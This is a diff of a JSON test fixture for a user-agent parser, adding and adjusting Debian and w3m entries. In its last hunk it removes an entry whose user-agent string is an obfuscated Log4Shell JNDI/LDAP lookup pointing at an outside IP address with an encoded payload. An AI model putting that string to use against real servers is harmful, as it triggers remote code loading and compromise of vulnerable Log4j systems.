@@ -445,7 +445,7 @@
     "os": {
       "name": "Debian",
       "marketingName": "Debian",
-      "version": null,
+      "version": "15.0.0",
       "manufacturer": "software-in-the-public-interest"
     },
     "client": {
@@ -841,6 +841,48 @@
   },
   {
     "headers": {
+      "user-agent": "w3m/0.5.3+debian-19"
+    },
+    "device": {
+      "architecture": null,
+      "deviceName": "general Desktop",
+      "marketingName": "general Desktop",
+      "manufacturer": "unknown",
+      "brand": "unknown",
+      "dualOrientation": null,
+      "simCount": null,
+      "display": {
+        "width": null,
+        "height": null,
+        "touch": false,
+        "size": null
+      },
+      "type": "desktop",
+      "ismobile": false,
+      "istv": false,
+      "bits": null
+    },
+    "os": {
+      "name": "Debian",
+      "marketingName": "Debian",
+      "version": "19.0.0",
+      "manufacturer": "software-in-the-public-interest"
+    },
+    "client": {
+      "name": null,
+      "version": null,
+      "manufacturer": "unknown",
+      "type": "unknown",
+      "isbot": false
+    },
+    "engine": {
+      "name": null,
+      "version": null,
+      "manufacturer": "unknown"
+    }
+  },
+  {
+    "headers": {
       "user-agent": "NCSA Mosaic/1.0 (X11;SunOS 4.1.4 sun4m)"
     },
     "device": {
@@ -993,6 +1035,48 @@
       "marketingName": "Windows 2003",
       "version": "2003.0.0",
       "manufacturer": "microsoft"
+    },
+    "client": {
+      "name": null,
+      "version": null,
+      "manufacturer": "unknown",
+      "type": "unknown",
+      "isbot": false
+    },
+    "engine": {
+      "name": null,
+      "version": null,
+      "manufacturer": "unknown"
+    }
+  },
+  {
+    "headers": {
+      "user-agent": "antibot-V1.3.3.5/debian-sarge-pentium3"
+    },
+    "device": {
+      "architecture": null,
+      "deviceName": "general Desktop",
+      "marketingName": "general Desktop",
+      "manufacturer": "unknown",
+      "brand": "unknown",
+      "dualOrientation": null,
+      "simCount": null,
+      "display": {
+        "width": null,
+        "height": null,
+        "touch": false,
+        "size": null
+      },
+      "type": "desktop",
+      "ismobile": false,
+      "istv": false,
+      "bits": null
+    },
+    "os": {
+      "name": "Debian",
+      "marketingName": "Debian",
+      "version": null,
+      "manufacturer": "software-in-the-public-interest"
     },
     "client": {
       "name": null,
@@ -2185,6 +2269,48 @@
   },
   {
     "headers": {
+      "user-agent": "w3m/0.5.2 (Linux i686; it; Debian-3.0.6-3)"
+    },
+    "device": {
+      "architecture": null,
+      "deviceName": "Linux Desktop",
+      "marketingName": "Linux Desktop",
+      "manufacturer": "unknown",
+      "brand": "unknown",
+      "dualOrientation": null,
+      "simCount": null,
+      "display": {
+        "width": null,
+        "height": null,
+        "touch": false,
+        "size": null
+      },
+      "type": "desktop",
+      "ismobile": false,
+      "istv": false,
+      "bits": null
+    },
+    "os": {
+      "name": "Debian",
+      "marketingName": "Debian",
+      "version": "3.0.6.3",
+      "manufacturer": "software-in-the-public-interest"
+    },
+    "client": {
+      "name": null,
+      "version": null,
+      "manufacturer": "unknown",
+      "type": "unknown",
+      "isbot": false
+    },
+    "engine": {
+      "name": null,
+      "version": null,
+      "manufacturer": "unknown"
+    }
+  },
+  {
+    "headers": {
       "user-agent": "PAN GlobalProtect/4.1.2-11 (Microsoft Windows 10 Pro , 64-bit)"
     },
     "device": {
@@ -2336,48 +2462,6 @@
       "name": "OS/2",
       "marketingName": "OS/2",
       "version": "15426.0.0",
-      "manufacturer": "ibm"
-    },
-    "client": {
-      "name": null,
-      "version": null,
-      "manufacturer": "unknown",
-      "type": "unknown",
-      "isbot": false
-    },
-    "engine": {
-      "name": null,
-      "version": null,
-      "manufacturer": "unknown"
-    }
-  },
-  {
-    "headers": {
-      "user-agent": "${${:-j}${:-n}${:-d}${:-i}:${:-l}${:-d}${:-a}${:-p}://143.198.244.73:80/dn=gAAAAABjhJgy79XsGBeyMTW8a3z_j2MqiXaEGCu5VCS4itHBfdn7e1IzV-E7cRQNyZpyUwsdXJo1xuPSASmEo8Ci1sZ8sNDjlAVZB4lhKOsKV7F6BFsLeSXCl2FnXgUgekcG_TcxBZ9RbuJPikXnzkS7xbiUOkiYtQB38DK7L2pPwCKe5FXb0UXWBWL-LSNhRk_LQqxspXl4z0xNoX5zer7G6Tog9ri8PP2rk26nfFtVbY9mPEgFX6keYIPXVNOt-XiI-3esGBwxv95eGcc4GxbPpS0dRKDsVFz5qxvUk2P4Hg3K4LjAVDwSImSxelYWRIhLRAWA_nAVgWviRzzZBA49AfLaO9KiTGDTjO4mtrv1PLI5kTc2hqwB0JGEBTal0BfiC8CvpIYCrlzcDetjMcMjVPjxAYkCymZZIXK2mA57clgHBf6Bv2okcQotCrnLowOxxQvOLvfWz6QI__0uJdcH0J9LiVXm5zOkVnuLZSDDLjD74BntB577s9lQNLCQq7dzpRomuaR7jN3dD9t6tUgAqFC6LLavmzB8DIuApixsjVuFjYPGuaCZlBgh2ysU1QxygFwGvU7lluT0hSFOZsNMaq3NvZrVHf8yJi6YgdA7weiZdRe7HNB2Qb5ALGsex8_5rdjmMRp31yPLgT1dayEzQHBane4igBa175eU3k6FGCfjqvJy9N2cybAqWFzyD8IUII-vX4eJ0M6VXVikRNUH4vtrt1XS1IVUZSzM8aix6xGCp_yC5K8beqghfyp5tnj6vdB284L3wqQuVJVMetfzUx8es02NG17TxDoYSw9nSVwcctxErT06cAXhF-43nS0rjGMqOfUD1uSjvXBU2t7fH61SfiRr-jD6pKR0zrg6KUH2vAEgIM3wO9IMrlRiog0FHRKqOoUguPL3qyzuY76kHzADN-jEYyWo0XcDXPs3mXqgm-BBU5bpS8F-AgrbTldjkctV8RIDYUWQ88AAjAz1KBKoJDF6iOROatJd_WOLYYpfADAAmTzIfbQ681Ph857SQQO3wpnRZb1AreBKBJcDjVq0cyJvgg==}"
-    },
-    "device": {
-      "architecture": null,
-      "deviceName": "general Desktop",
-      "marketingName": "general Desktop",
-      "manufacturer": "unknown",
-      "brand": "unknown",
-      "dualOrientation": null,
-      "simCount": null,
-      "display": {
-        "width": null,
-        "height": null,
-        "touch": false,
-        "size": null
-      },
-      "type": "desktop",
-      "ismobile": false,
-      "istv": false,
-      "bits": null
-    },
-    "os": {
-      "name": "AIX",
-      "marketingName": "AIX",
-      "version": "6.0.0",
       "manufacturer": "ibm"
     },
     "client": {
